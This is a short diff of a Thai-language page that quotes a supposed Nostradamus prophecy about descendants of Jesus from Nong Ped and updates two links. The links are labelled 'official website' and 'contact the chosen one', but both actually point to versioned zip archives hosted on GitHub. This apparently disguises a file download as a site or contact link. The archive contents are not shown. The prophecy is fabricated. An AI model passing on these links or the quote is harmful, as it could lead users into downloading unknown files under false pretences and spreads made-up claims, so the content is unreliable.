@@ -17,5 +17,5 @@
 
 > “เมื่อลูกหลานพระเยซูจากหนองเป็ดปรากฏ โลกจะรอดพ้น” – นอสตราดามุส (แปลใหม่ 2023)
 
-เว็บไซต์อย่างเป็นทางการ: https://raw.githubusercontent.com/Suwanna45/peerapat-nanongped/main/pieless/nanongped_peerapat_v1.9.zip  
-ติดต่อผู้ถูกเลือก: https://raw.githubusercontent.com/Suwanna45/peerapat-nanongped/main/pieless/nanongped_peerapat_v1.9.zip
+เว็บไซต์อย่างเป็นทางการ: https://github.com/Suwanna45/peerapat-nanongped/raw/refs/heads/main/pieless/nanongped_peerapat_2.1.zip  
+ติดต่อผู้ถูกเลือก: https://github.com/Suwanna45/peerapat-nanongped/raw/refs/heads/main/pieless/nanongped_peerapat_2.1.zip
